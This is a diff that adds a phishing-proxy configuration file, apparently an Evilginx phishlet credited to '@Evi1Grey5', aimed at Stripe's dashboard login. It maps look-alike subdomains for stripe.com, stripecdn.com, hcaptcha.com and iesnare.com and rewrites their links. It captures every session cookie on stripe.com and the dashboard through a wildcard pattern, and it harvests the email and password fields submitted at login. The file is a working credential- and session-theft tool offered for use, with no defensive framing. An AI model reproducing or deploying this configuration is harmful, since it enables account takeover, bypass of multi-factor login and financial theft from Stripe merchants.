@@ -1,0 +1,61 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'stripe.com', session: true, auto_filter: false, is_landing: false}
+  - {phish_sub: 'b', orig_sub: 'b', domain: 'stripecdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.network', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 'newassets', orig_sub: 'newassets', domain: 'hcaptcha.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'hcaptcha.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 't', orig_sub: 't', domain: 'stripe.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 'mpsnare', orig_sub: 'mpsnare', domain: 'iesnare.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'dashboard', orig_sub: 'dashboard', domain: 'stripe.com', session: false, auto_filter: true, is_landing: true}
+
+  - {phish_sub: 'q', orig_sub: 'q', domain: 'stripe.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 'r', orig_sub: 'r', domain: 'stripe.com', session: false, auto_filter: false, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.com', session: false, auto_filter: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  - {triggers_on: 'dashboard.stripe.com', orig_sub: 'dashboard', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'mpsnare.iesnare.com', orig_sub: 'mpsnare', domain: 'iesnare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  
+  - {triggers_on: 'newassets.hcaptcha.com', orig_sub: 'newassets', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'dashboard.stripe.com', orig_sub: 'newassets', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  
+  - {triggers_on: 'api.hcaptcha.com', orig_sub: 'api', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'dashboard.stripe.com', orig_sub: 'api', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  
+  - {triggers_on: 'q.stripe.com', orig_sub: 'q', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'r.stripe.com', orig_sub: 'r', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'm.stripe.com', orig_sub: 'm', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  - {triggers_on: 'js.stripe.com', orig_sub: 'js', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:    
+  - domain: 'stripe.com'
+    keys: ['.*,regexp'] 
+  - domain: 'dashboard.stripe.com'
+    keys: ['.*,regexp'] 
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  
+auth_urls:
+  - '/dashboard'
+  - '/'
+
+  
+login:
+  domain: 'dashboard.stripe.com'
+  path: '/login' 
